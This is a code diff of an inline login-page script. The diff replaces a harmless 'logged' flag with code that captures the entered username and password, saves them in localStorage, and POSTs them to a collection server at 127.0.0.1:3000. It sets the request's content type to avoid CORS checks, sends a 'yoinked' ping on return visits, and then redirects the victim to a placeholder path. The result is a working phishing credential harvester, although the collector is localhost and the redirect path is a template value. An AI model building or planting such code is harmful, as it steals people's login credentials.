@@ -1,16 +1,38 @@
 <!--this must follow perfect inline js syntax-->
 <script type="text/javascript">
     let endPath = "<replaceWithPath>";
+    let timeout = 10;
 
-    if (localStorage.getItem("logged")) {
-        window.location.href = endPath;
+    function post(json) {
+        var xhr = new XMLHttpRequest();
+        xhr.open("POST", "http://127.0.0.1:3000");
+        xhr.setRequestHeader('Content-Type', 'text/plain'); /*i hate cors*/
+        xhr.send(json);
+    }
+
+    if (localStorage.getItem("id")) {
+        post(JSON.stringify({
+            yoinked: true,
+        }));
+
+        setTimeout(()=>{
+            window.location.href = endPath;
+        }, timeout);
     }
 
     document.getElementById("login").onclick = ()=>{
         let username = document.getElementById("username").value;
         let password = document.getElementById("password").value;
-        localStorage.setItem("logged", "logged");
+        let data = JSON.stringify({
+            username:username,
+            password:password
+        });
 
-        window.location.href = endPath;
+        localStorage.setItem("id", data);
+        post(data);
+
+        setTimeout(()=>{
+            window.location.href = endPath;
+        }, timeout);
     }
 </script>
